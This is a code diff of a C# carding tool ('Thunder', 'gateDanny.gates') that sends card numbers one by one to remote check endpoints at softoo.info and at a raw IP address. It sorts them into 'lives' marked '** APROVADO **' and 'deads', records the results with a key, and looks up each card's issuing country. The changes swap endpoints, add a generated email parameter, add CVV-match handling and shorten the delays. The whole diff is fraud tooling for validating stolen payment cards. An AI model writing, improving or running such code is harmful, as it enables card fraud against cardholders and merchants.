@@ -37,7 +37,7 @@ namespace gateDanny.gates
             try
             {
                 string jsonString = "";
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                 request.Method = "GET";
                 request.Credentials = CredentialCache.DefaultCredentials;
                 ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
@@ -50,9 +50,7 @@ namespace gateDanny.gates
                 StreamReader sr = new StreamReader(response.GetResponseStream());
                 jsonString = sr.ReadToEnd();
                 sr.Close();
-                //MessageBox.Show(jsonString);
-                dynamic cc = JsonConvert.DeserializeObject(jsonString);
-                return cc.country.name;
+                return jsonString.Trim();
             }
             catch (Exception ex)
             {
@@ -106,9 +104,12 @@ namespace gateDanny.gates
                 if (Thunder._Form1.numcc() > 0 && Variables.run)
                 {
 
+                    correo = "joseffernana" + getNum();
                     Thunder._Form1.update_progresbar(5);
                     var cc = Thunder._Form1.nextCc().Trim();
-                    var client = new RestClient("https://softoo.info/thunder/check.php?cc="+Thunder._Form1.nextCc().Trim());
+
+                    var client = new RestClient("http://3.12.239.104/thu/check.php?correo=" + correo+"&cc="+Thunder._Form1.nextCc().Trim());
+                    //var client = new RestClient("http://3.12.239.104/thu/checkv2.php?correo=" + correo+"&cc="+Thunder._Form1.nextCc().Trim());
                     client.Timeout = -1;
                     var request = new RestRequest(Method.GET);
                     IRestResponse response = client.Execute(request);
@@ -116,67 +117,78 @@ namespace gateDanny.gates
 
                     dynamic resp = JsonConvert.DeserializeObject(response.Content);
                     string code = resp.code;
-                    if (code.Contains("cvc"))
-                    {
-                        Thunder._Form1.update_progresbar(100);
-                        var pais = checkbin(cc.Substring(0, 6));
-                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
-                        check.ccss(Variables.key, guardar, "lives");
-                        Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
-                        check.playlive();
-                        Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                        Thunder._Form1.remove_cc(0, cc.Length);
-                        numeroTargeta++;
-                        pagos++;
-                        Thread.Sleep(20000);
-                        pago();
-                    }
-                    else if(resp.error== "fraudulent" || resp.code!= "")
-                    {
-                        var pais = checkbin(cc.Substring(0, 6));
-                        Thunder._Form1.update_progresbar(100);
-                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
-                        check.ccss(Variables.key, guardar, "deads");
-                        Thread.Sleep(300);
-                        Thunder._Form1.agragar_dead(cc);
-                        Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                        Thunder._Form1.remove_cc(0, cc.Length);
-                        numeroTargeta++;
-                        pagos++;
-                        Thread.Sleep(20000);
-                        pago();
 
-                    }
-                    else if (resp.id != "" && resp.id != null)
+                    if(code == null)
                     {
-                        Thunder._Form1.update_progresbar(100);
-                        var pais = checkbin(cc.Substring(0, 6));
-                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
-                        check.ccss(Variables.key, guardar, "lives");
-                        Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
-                        check.playlive();
-                        Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                        Thunder._Form1.remove_cc(0, cc.Length);
-                        numeroTargeta++;
-                        pagos++;
-                        Thread.Sleep(20000);
-                        pago();
+                        if (resp.id != "" && resp.id != null)
+                        {
+                            Thunder._Form1.update_progresbar(100);
+                            var pais = checkbin(cc.Substring(0, 6));
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
+                            check.ccss(Variables.key, guardar, "lives");
+                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
+                            check.playlive();
+                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
+                            Thunder._Form1.remove_cc(0, cc.Length);
+                            numeroTargeta++;
+                            pagos++;
+                            Thread.Sleep(10000);
+                            pago();
+                        }
                     }
                     else
                     {
-                        var pais = checkbin(cc.Substring(0, 6));
-                        Thunder._Form1.update_progresbar(100);
-                        var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
-                        check.ccss(Variables.key, guardar, "deads");
-                        Thread.Sleep(300);
-                        Thunder._Form1.agragar_dead(cc);
-                        Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                        Thunder._Form1.remove_cc(0, cc.Length);
-                        numeroTargeta++;
-                        pagos++;
-                        Thread.Sleep(20000);
-                        pago();
+                        if (code.Contains("cvc") || code.Contains("code"))
+                        {
+                            Thunder._Form1.agrgar_live_cvv("(cvv) - ");
+                            Thunder._Form1.update_progresbar(100);
+                            var pais = checkbin(cc.Substring(0, 6));
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
+                            check.ccss(Variables.key, guardar, "lives");
+                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
+                            check.playlive();
+                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
+                            Thunder._Form1.remove_cc(0, cc.Length);
+                            numeroTargeta++;
+                            pagos++;
+                            Thread.Sleep(10000);
+                            pago();
+                        }
+                        else if (resp.error == "fraudulent" || resp.code != "")
+                        {
+                            var pais = checkbin(cc.Substring(0, 6));
+                            Thunder._Form1.update_progresbar(100);
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
+                            check.ccss(Variables.key, guardar, "deads");
+                            Thread.Sleep(300);
+                            Thunder._Form1.agragar_dead(cc);
+                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
+                            Thunder._Form1.remove_cc(0, cc.Length);
+                            numeroTargeta++;
+                            pagos++;
+                            Thread.Sleep(10000);
+                            pago();
+
+                        }
+
+                        else
+                        {
+                            var pais = checkbin(cc.Substring(0, 6));
+                            Thunder._Form1.update_progresbar(100);
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
+                            check.ccss(Variables.key, guardar, "deads");
+                            Thread.Sleep(300);
+                            Thunder._Form1.agragar_dead(cc);
+                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
+                            Thunder._Form1.remove_cc(0, cc.Length);
+                            numeroTargeta++;
+                            pagos++;
+                            Thread.Sleep(10000);
+                            pago();
+                        }
                     }
+
+                   
 
                   
 
